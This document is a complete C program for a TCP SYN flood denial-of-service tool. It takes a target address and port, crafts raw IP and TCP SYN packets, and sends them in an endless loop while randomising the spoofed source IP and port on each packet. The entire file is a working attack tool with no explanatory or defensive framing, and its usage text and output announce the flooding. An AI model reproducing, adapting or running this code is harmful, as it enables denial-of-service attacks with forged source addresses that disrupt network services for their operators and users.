#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
 
#define MAX_PACKET_SIZE 4096

/* function for header checksums */
unsigned short csum (unsigned short *buf, int nwords) {
    unsigned long sum;
    for (sum = 0; nwords > 0; nwords--)
        sum += *buf++;
    sum = (sum >> 16) + (sum & 0xffff);
    sum += (sum >> 16);
    return (unsigned short)(~sum);
}

void setup_ip_header(struct iphdr *iph) {    
    iph->ihl = 5;
    iph->version = 4;
    iph->tos = 0;    
    iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct tcphdr));
    iph->id = htonl(54321);
    iph->frag_off = 0;
    iph->ttl = MAXTTL;
    iph->protocol = 6;  // upper layer protocol, TCP
    iph->check = 0;
 
    // Initial IP, changed later in infinite loop
    iph->saddr = inet_addr("192.168.3.100");
}
 
void setup_tcp_header(struct tcphdr *tcph) {
    tcph->source = htons(5678);
    tcph->seq = random();
    tcph->ack_seq = 0;
    tcph->res2 = 0;
    tcph->doff = 5; // Make it look like there will be data
    tcph->syn = 1;
    tcph->window = htonl(65535);
    tcph->check = 0;
    tcph->urg_ptr = 0;    
}
 
int main(int argc, char *argv[]) {
    char datagram[MAX_PACKET_SIZE];
    struct iphdr *iph = (struct iphdr *)datagram;
    struct tcphdr *tcph = (struct tcphdr *)((u_int8_t *)iph + (5 * sizeof(u_int32_t)));
    struct sockaddr_in sin;
    char new_ip[sizeof "255.255.255.255"];
 
    if(argc != 3) {
        fprintf(stderr, "Invalid parameters!\n");
        fprintf(stdout, "Usage: %s <target IP/hostname> <port to be flooded>\n", argv[0]);
        exit(-1);
    }
 
    int s = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);    
    if(s < 0) {
        fprintf(stderr, "Could not open raw socket.\n");
        exit(-1);
    }        
 
    unsigned int floodport = atoi(argv[2]);
 
    sin.sin_family = AF_INET;
    sin.sin_port = htons(floodport);
    sin.sin_addr.s_addr = inet_addr(argv[1]);
 
    // Clear the data
    memset(datagram, 0, MAX_PACKET_SIZE);
 
    // Set appropriate fields in headers
    setup_ip_header(iph);
    setup_tcp_header(tcph);   
 
    tcph->dest = htons(floodport);
 
    iph->daddr = sin.sin_addr.s_addr;    
    iph->check = csum ((unsigned short *) datagram, iph->tot_len >> 1);
 
    /* a IP_HDRINCL call, to make sure that the kernel knows
    *     the header is included in the data, and doesn't insert
    *     its own header into the packet before our data 
    */    
    int tmp = 1;
    const int *val = &tmp;
    if(setsockopt(s, IPPROTO_IP, IP_HDRINCL, val, sizeof (tmp)) < 0) {
        fprintf(stderr, "Error: setsockopt() - Cannot set HDRINCL!\n");  
        exit(-1);
    }
 
    for(;;) {
        if(sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&sin, sizeof(sin)) < 0)
            fprintf(stderr, "sendto() error!!!.\n");
        else
            fprintf(stdout, "Flooding %s at %u...\n", argv[1], floodport);       
 
        // Randomize source IP and source port
        snprintf(new_ip,16,"%lu.%lu.%lu.%lu",random() % 255,random() % 255,random() % 255,random() % 255);
        iph->saddr = inet_addr(new_ip);       
        tcph->source = htons(random() % 65535);
        iph->check = csum ((unsigned short *) datagram, iph->tot_len >> 1);
    }
 
    return 0;
}
